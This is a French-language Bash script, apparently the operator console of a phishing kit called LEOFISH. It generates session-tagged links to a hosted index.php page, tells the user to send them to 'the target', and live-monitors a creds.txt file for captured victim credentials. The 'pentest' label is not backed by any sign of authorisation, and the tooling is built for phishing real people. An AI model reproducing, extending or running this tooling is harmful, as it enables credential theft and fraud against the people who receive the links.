#!/bin/bash

# ══════════════════════════════════════════
#         LEOFISH PENTEST TERMINAL
# ══════════════════════════════════════════

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Fichiers
CREDIT_FILE="credit.text"
HELP_FILE="help.text"
LOGS_FILE="creds.txt"

# URL de ton app Render (modifie ici)
APP_URL="https://leofish-tool-v1-0.onrender.com/index.php"

# Créer dossier sessions
mkdir -p sessions

# ══════════════════════════════════════════
# BANNIÈRE + LOGO
# ══════════════════════════════════════════
show_banner() {
    clear
    echo -e "${CYAN}"
    if [ -f "$CREDIT_FILE" ]; then
        cat "$CREDIT_FILE"
    fi
    echo -e "${NC}"
    echo -e "${WHITE}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${WHITE}║${YELLOW}                    LEOFISH TERMINAL v1.0                    ${WHITE}║${NC}"
    echo -e "${WHITE}║${GREEN}                    Victim → Hacker Monitoring                        ${WHITE}║${NC}"
    echo -e "${WHITE}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

# ══════════════════════════════════════════
# GÉNÉRER LIEN + MONITORING
# ══════════════════════════════════════════
generate_campaign() {
    show_banner
    echo -e "${PURPLE}🎯 NOUVELLE CAMPAGNE DE PHISH ${NC}"
    echo ""

    # Lancer le serveur Render (ping pour le réveiller)
    echo -e "${YELLOW}⚡ Connexion au serveur Render...${NC}"
    curl -s --max-time 10 "$APP_URL" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}✅ Serveur en ligne${NC}"
    else
        echo -e "${YELLOW}⚠️  Serveur en démarrage (Render cold start, patiente 30s...)${NC}"
    fi
    echo ""

    # ID unique de session
    SESSION_ID=$(date +%s)_$(openssl rand -hex 8 2>/dev/null || echo $RANDOM$RANDOM)

    # Lien vers index.php avec l'ID session
    PHISH_LINK="${APP_URL}/index.php?session=${SESSION_ID}"

    # Log fichier de cette session
    SESSION_LOG="sessions/${SESSION_ID}.log"
    echo "=== SESSION PENTEST $(date) ===" > "$SESSION_LOG"
    echo "Lien: $PHISH_LINK" >> "$SESSION_LOG"

    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║${WHITE}  ✅  LIEN GÉNÉRÉ — ENVOIE À LA CIBLE :                              ${GREEN}║${NC}"
    echo -e "${GREEN}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}║  ${CYAN}${PHISH_LINK}${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}📤 Copie ce lien et envoie-le à la cible${NC}"
    echo -e "${PURPLE}⏳ Dès que la cible l'ouvre, les logs apparaîtront ici${NC}"
    echo ""
    read -rp "$(echo -e "${WHITE}Appuie sur Entrée pour démarrer le monitoring...${NC}")"

    # Lancer le monitoring
    monitor_logs "$SESSION_ID" "$SESSION_LOG"
}

# ══════════════════════════════════════════
# MONITORING LOGS TEMPS RÉEL (lit logs.txt)
# ══════════════════════════════════════════
monitor_logs() {
    local session_id=$1
    local session_log=$2
    local last_line=0

    show_banner
    echo -e "${RED}👁️  MONITORING LIVE${NC} — Session: ${CYAN}${session_id}${NC}"
    echo -e "${RED}══════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${BLUE}📄 Lecture des logs depuis : ${WHITE}${LOGS_FILE}${NC}"
    echo ""

    # Créer logs.txt s'il n'existe pas
    touch "$LOGS_FILE"

    while true; do
        # Lire les nouvelles lignes du fichier logs.txt
        current_lines=$(wc -l < "$LOGS_FILE")

        if [ "$current_lines" -gt "$last_line" ]; then
            # Afficher uniquement les nouvelles lignes
            new_data=$(tail -n +"$((last_line + 1))" "$LOGS_FILE")

            while IFS= read -r line; do
                if [ -n "$line" ]; then
                    timestamp=$(date '+%H:%M:%S')
                    echo -e "${GREEN}[${timestamp}]${YELLOW} $line${NC}"
                    echo "${timestamp} - $line" >> "$session_log"
                fi
            done <<< "$new_data"

            last_line=$current_lines
        else
            # Aucune activité → afficher un dot toutes les 5s
            echo -ne "${BLUE}.${NC}"
        fi

        sleep 2
    done
}

# ══════════════════════════════════════════
# VOIR LES SESSIONS ENREGISTRÉES
# ══════════════════════════════════════════
show_sessions() {
    show_banner
    echo -e "${YELLOW}📂 TOUTES LES SESSIONS PENTEST${NC}"
    echo ""

    if [ -z "$(ls -A sessions/ 2>/dev/null)" ]; then
        echo -e "${RED}  Aucune session enregistrée.${NC}"
    else
        echo -e "${CYAN}  Fichier                              Date${NC}"
        echo -e "${WHITE}  ──────────────────────────────────────────────${NC}"
        ls -lt sessions/ | tail -n +2 | awk '{printf "  %-35s %s %s %s\n", $9, $6, $7, $8}'
        echo ""
        read -rp "$(echo -e "${WHITE}Nom du fichier à ouvrir (ou Entrée pour passer) : ${NC}")" session_file

        if [ -n "$session_file" ] && [ -f "sessions/$session_file" ]; then
            echo ""
            echo -e "${BLUE}╔══ Contenu de $session_file ══${NC}"
            cat "sessions/$session_file"
            echo -e "${BLUE}╚════════════════════════════════${NC}"
        fi
    fi

    echo ""
    read -rp "$(echo -e "${WHITE}Entrée pour revenir...${NC}")"
}

# ══════════════════════════════════════════
# AIDE (lit help.text)
# ══════════════════════════════════════════
show_help() {
    show_banner
    echo -e "${YELLOW}📖 GUIDE D'UTILISATION${NC}"
    echo -e "${WHITE}══════════════════════════════════════════════════════════════════════${NC}"
    echo ""
    if [ -f "$HELP_FILE" ]; then
        cat "$HELP_FILE"
    else
        echo -e "${RED}  ❌ Fichier help.text introuvable.${NC}"
    fi
    echo ""
    read -rp "$(echo -e "${WHITE}Entrée pour revenir...${NC}")"
}

# ══════════════════════════════════════════
# MENU PRINCIPAL
# ══════════════════════════════════════════
main_menu() {
    while true; do
        show_banner

        echo -e "  ${GREEN}1${NC}  ${CYAN}🎣${NC}  ${YELLOW}Nouvelle campagne${NC}  ${WHITE}(générer lien + monitoring)${NC}"
        echo -e "  ${GREEN}2${NC}  ${CYAN}📂${NC}  ${YELLOW}Sessions enregistrées${NC}"
        echo -e "  ${GREEN}3${NC}  ${CYAN}📖${NC}  ${YELLOW}Aide${NC}"
        echo -e "  ${GREEN}0${NC}  ${RED}❌  Quitter${NC}"
        echo ""
        read -rp "$(echo -e "  ${WHITE}LEOFISH ▶ ${NC}")" choice

        case $choice in
            1) generate_campaign ;;
            2) show_sessions ;;
            3) show_help ;;
            0) echo -e "${GREEN}✅ Session terminée. À bientôt.${NC}"; echo ""; exit 0 ;;
            *) echo -e "${RED}  ❌ Choix invalide${NC}"; sleep 1 ;;
        esac
    done
}

# ══════════════════════════════════════════
# VÉRIFICATIONS AU DÉMARRAGE
# ══════════════════════════════════════════
if [ ! -f "$CREDIT_FILE" ]; then
    echo -e "${RED}❌ Erreur : credit.text manquant — place ton logo dedans.${NC}"
    exit 1
fi

if [ ! -f "$HELP_FILE" ]; then
    echo -e "${YELLOW}⚠️  help.text manquant — crée le fichier pour afficher l'aide.${NC}"
fi

if [ ! -f "$LOGS_FILE" ]; then
    touch "$LOGS_FILE"
    echo -e "${BLUE}ℹ️  logs.txt créé — terminal.php doit écrire dedans.${NC}"
    sleep 1
fi

main_menu
